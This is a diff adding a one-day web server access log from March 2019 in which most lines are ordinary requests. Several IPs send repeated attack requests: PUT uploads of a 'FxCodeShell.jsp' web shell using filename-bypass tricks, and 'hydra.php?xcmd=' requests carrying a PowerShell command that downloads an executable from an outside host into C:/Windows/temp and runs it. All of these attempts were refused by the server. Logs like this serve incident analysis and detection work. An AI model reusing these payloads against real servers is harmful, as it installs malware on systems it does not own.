@@ -1,0 +1,81 @@
+139.162.111.98 - - [12/Mar/2019:00:35:24 +0800] "GET / HTTP/1.1" 200 11418
+47.105.109.215 - - [12/Mar/2019:00:59:15 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
+47.105.109.215 - - [12/Mar/2019:00:59:15 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
+47.105.109.215 - - [12/Mar/2019:00:59:15 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
+47.105.109.215 - - [12/Mar/2019:00:59:15 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
+47.105.136.52 - - [12/Mar/2019:01:14:40 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
+47.105.136.52 - - [12/Mar/2019:01:14:40 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
+47.105.136.52 - - [12/Mar/2019:01:14:40 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
+47.105.136.52 - - [12/Mar/2019:01:14:40 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
+47.52.221.59 - - [12/Mar/2019:01:49:43 +0800] "GET / HTTP/1.0" 200 11398
+157.119.215.102 - - [12/Mar/2019:01:52:34 +0800] "GET / HTTP/1.1" 200 11418
+47.101.204.90 - - [12/Mar/2019:02:40:00 +0800] "GET / HTTP/1.1" 200 11418
+171.96.123.63 - - [12/Mar/2019:03:10:05 +0800] "GET / HTTP/1.0" 200 11398
+47.101.204.125 - - [12/Mar/2019:03:21:17 +0800] "GET / HTTP/1.1" 200 11418
+165.255.145.30 - - [12/Mar/2019:03:26:09 +0800] "GET / HTTP/1.1" 200 11418
+201.236.249.84 - - [12/Mar/2019:03:33:21 +0800] "GET / HTTP/1.1" 200 11418
+47.94.52.159 - - [12/Mar/2019:03:34:27 +0800] "GET / HTTP/1.0" 200 11398
+45.33.10.162 - - [12/Mar/2019:04:16:19 +0800] "-" 400 -
+122.116.152.7 - - [12/Mar/2019:05:54:48 +0800] "GET / HTTP/1.0" 200 11398
+139.162.79.87 - - [12/Mar/2019:05:57:50 +0800] "GET / HTTP/1.1" 200 11418
+94.61.139.199 - - [12/Mar/2019:06:07:40 +0800] "GET / HTTP/1.0" 200 11398
+47.97.23.199 - - [12/Mar/2019:06:32:57 +0800] "GET / HTTP/1.0" 200 11398
+80.82.70.187 - - [12/Mar/2019:07:38:28 +0800] "GET /cache/global/img/gs.gif HTTP/1.1" 404 997
+185.234.217.215 - - [12/Mar/2019:07:53:43 +0800] "CONNECT www.google.com:443 HTTP/1.1" 400 -
+196.52.43.86 - - [12/Mar/2019:07:59:12 +0800] "GET / HTTP/1.0" 200 11398
+74.82.47.5 - - [12/Mar/2019:08:35:07 +0800] "GET / HTTP/1.1" 200 11418
+47.105.136.52 - - [12/Mar/2019:09:20:27 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
+47.105.136.52 - - [12/Mar/2019:09:20:27 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
+47.105.136.52 - - [12/Mar/2019:09:20:27 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
+47.105.136.52 - - [12/Mar/2019:09:20:27 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
+47.52.210.38 - - [12/Mar/2019:09:31:34 +0800] "GET / HTTP/1.0" 200 11398
+177.138.22.243 - - [12/Mar/2019:09:51:15 +0800] "GET / HTTP/1.1" 200 11418
+106.15.202.177 - - [12/Mar/2019:10:05:10 +0800] "GET / HTTP/1.1" 200 11418
+201.0.181.50 - - [12/Mar/2019:10:38:02 +0800] "GET / HTTP/1.1" 200 11418
+188.152.218.106 - - [12/Mar/2019:11:14:28 +0800] "GET / HTTP/1.1" 200 11418
+106.14.215.243 - - [12/Mar/2019:11:31:31 +0800] "GET / HTTP/1.1" 200 11418
+79.98.220.71 - - [12/Mar/2019:12:17:06 +0800] "GET / HTTP/1.1" 200 11418
+101.132.153.242 - - [12/Mar/2019:12:45:44 +0800] "GET / HTTP/1.1" 200 11418
+47.105.136.52 - - [12/Mar/2019:13:48:19 +0800] "GET null null" 400 -
+47.105.136.52 - - [12/Mar/2019:13:48:19 +0800] "GET null null" 400 -
+47.105.136.52 - - [12/Mar/2019:13:48:19 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/iuzbdelqkmwfode31726.exe');start%20C:/Windows/temp/iuzbdelqkmwfode31726.exe HTTP/1.1" 404 983
+47.105.136.52 - - [12/Mar/2019:13:51:15 +0800] "-" 400 -
+47.105.136.52 - - [12/Mar/2019:13:51:15 +0800] "-" 400 -
+47.101.204.203 - - [12/Mar/2019:14:35:36 +0800] "GET / HTTP/1.1" 200 11418
+120.132.3.65 - - [12/Mar/2019:14:38:34 +0800] "-" 400 -
+120.132.3.65 - - [12/Mar/2019:14:38:34 +0800] "-" 400 -
+120.132.3.65 - - [12/Mar/2019:14:38:34 +0800] "GET /404/search_children.js HTTP/1.1" 404 995
+139.224.112.110 - - [12/Mar/2019:15:23:33 +0800] "GET / HTTP/1.1" 200 11418
+47.105.46.213 - - [12/Mar/2019:15:58:13 +0800] "GET null null" 400 -
+47.105.46.213 - - [12/Mar/2019:15:58:13 +0800] "GET null null" 400 -
+47.105.46.213 - - [12/Mar/2019:15:58:13 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/lfeuxhwcyyzbipi29310.exe');start%20C:/Windows/temp/lfeuxhwcyyzbipi29310.exe HTTP/1.1" 404 983
+103.60.175.43 - - [12/Mar/2019:16:20:41 +0800] "GET / HTTP/1.1" 200 11418
+186.208.23.199 - - [12/Mar/2019:16:32:55 +0800] "GET / HTTP/1.1" 200 11418
+58.150.60.162 - - [12/Mar/2019:18:43:57 +0800] "GET /login.cgi HTTP/1.1" 404 969
+101.132.67.50 - - [12/Mar/2019:19:11:29 +0800] "GET / HTTP/1.1" 200 11418
+58.150.60.162 - - [12/Mar/2019:19:39:03 +0800] "POST /WEB_VMS/LEVEL15/ HTTP/1.1" 404 983
+47.105.136.52 - - [12/Mar/2019:20:31:39 +0800] "GET null null" 400 -
+47.105.136.52 - - [12/Mar/2019:20:31:39 +0800] "GET null null" 400 -
+47.105.136.52 - - [12/Mar/2019:20:31:39 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/iuzbdelqkmwfode31726.exe');start%20C:/Windows/temp/iuzbdelqkmwfode31726.exe HTTP/1.1" 404 983
+79.106.164.110 - - [12/Mar/2019:20:48:04 +0800] "GET / HTTP/1.0" 200 11398
+47.105.46.213 - - [12/Mar/2019:21:19:36 +0800] "GET null null" 400 -
+47.105.46.213 - - [12/Mar/2019:21:19:36 +0800] "GET null null" 400 -
+47.105.46.213 - - [12/Mar/2019:21:19:36 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/lfeuxhwcyyzbipi29310.exe');start%20C:/Windows/temp/lfeuxhwcyyzbipi29310.exe HTTP/1.1" 404 983
+159.146.92.33 - - [12/Mar/2019:21:20:14 +0800] "GET / HTTP/1.1" 200 11418
+111.206.52.81 - - [12/Mar/2019:21:21:16 +0800] "GET /server-status HTTP/1.1" 404 977
+47.105.46.213 - - [12/Mar/2019:21:24:16 +0800] "-" 400 -
+47.105.46.213 - - [12/Mar/2019:21:24:16 +0800] "-" 400 -
+47.105.109.215 - - [12/Mar/2019:21:36:12 +0800] "GET /struts2-rest-showcase/orders.xhtml HTTP/1.1" 404 1019
+47.105.109.215 - - [12/Mar/2019:21:36:12 +0800] "GET /index.action HTTP/1.1" 404 975
+47.105.109.215 - - [12/Mar/2019:21:36:12 +0800] "GET /index.do HTTP/1.1" 404 967
+47.105.122.250 - - [12/Mar/2019:22:21:27 +0800] "GET null null" 400 -
+47.105.122.250 - - [12/Mar/2019:22:21:27 +0800] "GET null null" 400 -
+47.105.122.250 - - [12/Mar/2019:22:21:27 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/jiilaouijemtuvp26584.exe');start%20C:/Windows/temp/jiilaouijemtuvp26584.exe HTTP/1.1" 404 983
+47.105.136.52 - - [12/Mar/2019:23:10:36 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
+47.105.136.52 - - [12/Mar/2019:23:10:36 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
+47.105.136.52 - - [12/Mar/2019:23:10:36 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
+47.105.136.52 - - [12/Mar/2019:23:10:36 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
+47.105.122.250 - - [12/Mar/2019:23:31:07 +0800] "GET null null" 400 -
+47.105.122.250 - - [12/Mar/2019:23:31:07 +0800] "GET null null" 400 -
+47.105.122.250 - - [12/Mar/2019:23:31:07 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/jiilaouijemtuvp26584.exe');start%20C:/Windows/temp/jiilaouijemtuvp26584.exe HTTP/1.1" 404 983
+47.101.204.94 - - [12/Mar/2019:23:42:48 +0800] "GET / HTTP/1.1" 200 11418
